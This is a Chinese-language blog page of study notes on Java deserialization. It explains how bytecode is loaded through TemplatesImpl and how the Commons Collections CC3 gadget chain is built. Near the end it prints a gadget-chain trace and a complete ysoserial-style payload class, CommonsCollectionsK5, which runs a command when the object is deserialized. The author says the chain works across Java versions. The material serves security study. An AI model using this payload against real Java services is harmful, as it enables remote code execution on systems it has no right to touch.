@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="tiehanhan" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      java安全漫谈观后感(六)-CC3篇 
+      
+      
+      |
+    
+     daidaitiehanhan&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/avatar.gif">
+    <link rel="icon" href="/images/avatar.gif">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.gif" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">tiehanhan</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">java安全漫谈观后感(六)-CC3篇</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2022-04-25 21:40:19
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="java安全漫谈观后感-六-CC3篇"><a href="#java安全漫谈观后感-六-CC3篇" class="headerlink" title="java安全漫谈观后感(六)-CC3篇"></a>java安全漫谈观后感(六)-CC3篇</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="字节码"><a href="#字节码" class="headerlink" title="字节码"></a>字节码</h3><blockquote>
+<p>严格来说，Java字节码(ByteCode)其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中。</p>
+<p>众所周知，不同平台、不同CPU的计算机指令有差异，但因为Java是一门跨平台的编译型语言，所以这些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台的JVM虚拟机中。</p>
+<p>甚至，开发者可以用类似Scala、Kotlin这样的语言编写代码，只要你的编译器能够将代码编译成.class文件，都可以在JVM虚拟机中运行</p>
+</blockquote>
+<p>个人理解字节码就是javac编译后，将我们能读懂的.java文件翻译成java虚拟机能读懂的语言，方便jvm虚拟机将其翻译为机器语言并执行。</p>
+<h3 id="加载字节码的几种方式"><a href="#加载字节码的几种方式" class="headerlink" title="加载字节码的几种方式"></a>加载字节码的几种方式</h3><h4 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class.forName"></a>Class.forName</h4><p>前面学反射的时候可以了解到我们可以用Class.forName来加载一个类,同时这种加载方式会执行初始化操作。</p>
+<h4 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h4><p><code>ClassLoader#loadClass</code>是一个很典型的类加载方式，类如其名。但这个加载过程中是不会执行到初始化操作的，一般需要我们手动加上<code>newInstance</code>触发初始化操作。</p>
+<blockquote>
+<p><code>ClassLoader</code>是什么呢?它就是一个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的<code>ClassLoader</code>就是根据类名来加载类，这个类名是类完整路径，如<code>java.lang.Runtime</code> 。</p>
+<p><code>URLClassLoader</code>实际上是我们平时默认使用的<code>AppClassLoader</code>父类，所以，我们解释<code>URLClassLoader</code>的工作过程实际上就是在解释默认的Java类加载器的工作流程。正常情况下，Java会根据配置项<code>sun.boot.class.path</code>和<code>java.class.path</code>中列举到的基础路径(这些路径是经过处理后的<code>java.net.URL</code>类)来寻找.class文件来加载，而这个基础路径有分为三种情况:</p>
+<ul>
+<li>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用<code>JarLoader</code>来寻找类，即为在Jar包中寻找.class文件</li>
+<li>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用<code>FileLoader</code>来寻找类，即为在本地文件系统中寻找.class文件</li>
+<li>URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的<code>Loader</code>来寻找类</li>
+</ul>
+</blockquote>
+<p>例如可以看看p神给的一个URLClassLoader加载类的案例：</p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421163534710.png" alt="image-20220421163534710"></p>
+<p>这里有些小问题，比如如果要加载的Class带有包名，比如test.Hello，就得把Hello.class放到test目录才能正常加载。或者就把要执行的一切编译成jar文件，远程加载这个jar文件，也可以正常指定包名加载执行到指定Class。</p>
+<p>这种远程加载的思路在代码执行情景不太方便直接写入内存马等操作时，如果目标出网，可以考虑用这种思路远程加载Class并初始化执行。</p>
+<h4 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h4><p>所有ClassLoader都会经过下面三个调用过程:</p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421163611002.png" alt="image-20220421163611002"></p>
+<blockquote>
+<ul>
+<li><code>loadClass</code>的作用是从已加载的类缓存、父加载器等位置寻找类(这里实际上是双亲委派机 制)，在前面没有找到的情况下，执行 <code>findClass</code></li>
+<li><code>findClass</code>的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给<code>defineClass</code></li>
+<li><code>defineClass</code>的作用是处理前面传入的字节码，将其处理成真正的Java类</li>
+</ul>
+<p>所以可见，真正核心的部分其实是<code>defineClass</code>，他决定了如何将一段字节流转变成一个Java类，Java默认的 <code>ClassLoader#defineClass</code>是一个native方法，逻辑在JVM的C语言代码中。</p>
+</blockquote>
+<p>看一个demo</p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421163648675.png" alt="image-20220421163648675"></p>
+<p><code>defineClass</code>并不会执行初始化操作，所以需要补上<code>newInstance()</code>调用其无参构造函数触发初始化。本身的<code>defineClass</code>是<code>protected</code>修饰的，所以只能用反射去取出来用。还有一点是如果要加载的类有包名则得跟上具体的包名。</p>
+<h4 id="TemplatesImpl加载字节码"><a href="#TemplatesImpl加载字节码" class="headerlink" title="TemplatesImpl加载字节码"></a>TemplatesImpl加载字节码</h4><p>虽然defineClass方法常常不能被我们直接取得，但是大概率会有其它地方会用到它，例如CC链中的另一个大角色<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl </code>。</p>
+<p>看看关键点</p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421163710977.png" alt="image-20220421163710977"></p>
+<p><code>TemplatesImpl</code>类的内部类<code>TransletClassLoader</code>重写了<code>defineClass</code>并没有声明作用域</p>
+<blockquote>
+<p>Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为default。所以也就是说这里的<code>defineClass</code>由其父类的 <code>protected</code>类型变成了一个<code>default</code>类型的方法，可以被类外部调用。</p>
+</blockquote>
+<p>我们跟下哪些地方会调用到这个重写的defineClass</p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421163812996.png" alt="image-20220421163812996"></p>
+<p>即<code>TemplatesImpl</code>的<code>defineTransletClasses()</code>方法会用到。那看看哪里会用到这个<code>defineTransletClasses()</code>方法。</p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421163827113.png" alt="image-20220421163827113"></p>
+<p>其中<code>getTransletClasses()</code>和<code>getTransletIndex()</code>均没有被其它地方使用到，且<code>getTransletClasses()</code>是private修饰无法被调用，<code>getTransletIndex()</code>是public修饰理论上可以用，但我本地触发不了。</p>
+<p>搜了下<code>getTransletIndex()</code>相关的分析，找到了个师傅的文章。</p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421164006325.png" alt="image-20220421164006325"></p>
+<p>直观感觉<code>getTransletIndex()</code>行是因为只考虑到了<code>defineClass()</code>方法写入Class字节码,但<code>defineClass()</code>本身不会实例化，所以自然不会触发到代码执行。相对比可以看看<code>getTransletInstance()</code>这个触发点</p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421164025069.png" alt="image-20220421164025069"></p>
+<p>在<code>defineTransletClasses()</code>后还有个<code>newInstance()</code>操作执行类初始化。</p>
+<p>只能看看剩下的<code>getTransletInstance()</code>了</p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421163845424.png" alt="image-20220421163845424"></p>
+<p>可以看到<code>newTransformer()</code>是public且可以触发<code>defineTransletClasses()</code>方法</p>
+<p>同时看到有很多处地方有调用<code>newTransformer()</code></p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421163901946.png" alt="image-20220421163901946"></p>
+<p>例如<code>TemplatesImpl</code>的<code>getOutputProperties</code></p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421163914163.png" alt="image-20220421163914163"></p>
+<p>所以<code>TemplatesImpl#getOutputProperties()</code>和<code>TemplatesImpl#newTransformer()</code>都可以加载字节码并执行。</p>
+<p>下面看看一个基于<code>TemplateImpl</code>加载字节码并初始化执行java代码的demo，这个demo中用<code>obj.newTransformer()</code>或 <code>obj.getOutputProperties()</code>都可以触发。</p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421163928960.png" alt="image-20220421163928960"></p>
+<blockquote>
+<p>其中，setFieldValue方法用来设置私有属性，可见，这里我设置了三个属性: <code>_bytecodes</code>、<code>_name</code>和<code>_tfactory</code>。<code>_bytecodes</code>是由字节码组成的数组;<code>_name</code>可以是任意字符串，只要不为null即可;<code>_tfactory</code>需要是一个<code>TransformerFactoryImpl</code>对象，因为<code>TemplatesImpl#defineTransletClasses()</code>方法里有调用到<code>_tfactory.getExternalExtensionsMap()</code>，如果是null会出错。</p>
+<p>另外，值得注意的是，<code>TemplatesImpl</code>中对加载的字节码是有一定要求的:这个字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类。</p>
+</blockquote>
+<p>所以可以说我们**整个TemplatesImpl加载字节码执行代码的核心就在TemplateImpl.newTransformer()**。</p>
+<h4 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h4><p>实战中常常用到的一个姿势，可惜在8u251后被改了无法使用，细节建议阅读<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">p师傅大作</a></p>
+<h3 id="构造CC3"><a href="#构造CC3" class="headerlink" title="构造CC3"></a>构造CC3</h3><h4 id="把CC1改成TemplatesImpl的形式"><a href="#把CC1改成TemplatesImpl的形式" class="headerlink" title="把CC1改成TemplatesImpl的形式"></a>把CC1改成TemplatesImpl的形式</h4><p>照着之前的demo弄，应该并不难理解，前面说了通过transformers链的配合我们可以执行任意类的任意方法,所以我们只需要把<code>ConstantTransformer</code>换成<code>TemplatesImpl</code>对象,同时用<code>InvokerTransformer</code>触发<code>newTransformer()</code>方法即可</p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421164042637.png" alt="image-20220421164042637"></p>
+<h4 id="InvokerTransformer被禁用"><a href="#InvokerTransformer被禁用" class="headerlink" title="InvokerTransformer被禁用?"></a>InvokerTransformer被禁用?</h4><p>一些反序列化过滤器，不允许不满足特定黑白名单的类做反序列化操作，例如p神给的例子<a target="_blank" rel="noopener" href="https://github.com/ikkisoft/SerialKiller/blob/998c0abc5b/config/serialkiller.conf">SerialKiller</a></p>
+<p>其中禁用了<code>InvokerTransformer</code></p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421164057543.png" alt="image-20220421164057543"></p>
+<p><code>InvokerTransformer</code>的作用是调用任意方法，被禁用则意味着我们不能像之前一样随意触发到<code>TemplatesImpl</code>类的<code>newTransformer()</code>方法。</p>
+<p>不过好在我们之前分析有很多地方也会触发到<code>newTransformer()</code>方法。(这里的其他几个方法有兴趣也可以跟跟， 理论上也可以触发)</p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421164112904.png" alt="image-20220421164112904"></p>
+<p>可以看到其中<code>TrAXFilter</code>类的构造函数会触发执行<code>TemplatesImpl.newTransformer()</code>方法</p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421164129225.png" alt="image-20220421164129225"></p>
+<p>这意味着如果我们能找到一个方法触发任意类的构造方法，我们就可以拿到<code>TemplatesImpl.newTransformer()</code>。</p>
+<h4 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h4><p>又一个Transformer登场，InstantiateTransformer的作用就是调用构造方法。</p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421164145289.png" alt="image-20220421164145289"></p>
+<p>可以看到会调用input对象的构造函数，<code>InstantiateTransformer</code>传入的第一个参数<code>iParamTypes</code>是<code>getConstructor</code>的参数，第二个参数iArgs是我们构造的恶意<code>TemplatesImpl</code>对象。</p>
+<p>其它地方不用改直接用就能正常触发了。</p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421164158026.png" alt="image-20220421164158026"></p>
+<h4 id="完整版CC3"><a href="#完整版CC3" class="headerlink" title="完整版CC3"></a>完整版CC3</h4><p>整个调用链如下:</p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421224942927.png" alt="image-20220421224942927"></p>
+<p>gadget Chain的核心步骤是:		</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  Gadet Chain:</span></span><br><span class="line"><span class="comment">//            java.util.HashMap.readObject()</span></span><br><span class="line"><span class="comment">//                 org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">//                 org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">//                 org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">//						     org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">//                     org.apache.commons.collections.functors.InstantiateTransformer.transform()</span></span><br><span class="line"><span class="comment">//                         TrAXFilter.&lt;init&gt;</span></span><br><span class="line"><span class="comment">//												    TemplatesImpl.newTransfomer()</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>只需要改改CC6的<code>transformers</code>链，改成用<code>InstantiateTransformer</code>触发<code>TemplatesImpl.newTransformer()</code>执行java代码即可得到一个通用java版本的CC3</p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421164220589.png" alt="image-20220421164220589"></p>
+<p>yso中的CC3是基于<code>AnnotationInvocationHandler</code>触发LazyMap.get，所以会受到版本限制，我们这里这种基于CC6魔改的实现是可以全版本通用的。</p>
+<p>顺手改了份yso能用的，但由于这个gadget仍然是基于数组的，所以感觉并没有什么太大用处</p>
+<p><img src="/2022/04/25/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%85%AD)-CC3%E7%AF%87/image-20220421164244411.png" alt="image-20220421164244411"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollectionsK5</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Map&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Map <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//final Transformer[] transformers = CommonsCollectionsUtil.getTransformerList(command);</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tpl</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tpl&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">inertChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, String&gt; innerMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">m</span> <span class="operator">=</span> LazyMap.decorate(innerMap, inertChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tied</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(m, <span class="string">&quot;v&quot;</span>);</span><br><span class="line">        outerMap.put(tied, <span class="string">&quot;t&quot;</span>);</span><br><span class="line">        innerMap.clear();</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(inertChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line">        <span class="keyword">return</span> outerMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//args = new String[]&#123;&quot;bcel:&quot;&#125;;</span></span><br><span class="line">        PayloadRunner.run(CommonsCollectionsK5.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/04/24/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E4%BA%94)-CC6%E7%AF%87/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2022-04-25 21:40:19
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F-%E5%85%AD-CC3%E7%AF%87"><span class="toc-text">java安全漫谈观后感(六)-CC3篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-text">字节码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-text">加载字节码的几种方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Class-forName"><span class="toc-text">Class.forName</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLClassLoader"><span class="toc-text">URLClassLoader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ClassLoader-defineClass"><span class="toc-text">ClassLoader#defineClass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-text">TemplatesImpl加载字节码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BCEL-ClassLoader"><span class="toc-text">BCEL ClassLoader</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0CC3"><span class="toc-text">构造CC3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%8ACC1%E6%94%B9%E6%88%90TemplatesImpl%E7%9A%84%E5%BD%A2%E5%BC%8F"><span class="toc-text">把CC1改成TemplatesImpl的形式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#InvokerTransformer%E8%A2%AB%E7%A6%81%E7%94%A8"><span class="toc-text">InvokerTransformer被禁用?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#InstantiateTransformer"><span class="toc-text">InstantiateTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%89%88CC3"><span class="toc-text">完整版CC3</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/daidaitiehanhan">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/">Copyright © 2022 tiehanhan</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://daidaitiehanhan.github.io/">Theme by tiehanhan | Powered by tiehanhan</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
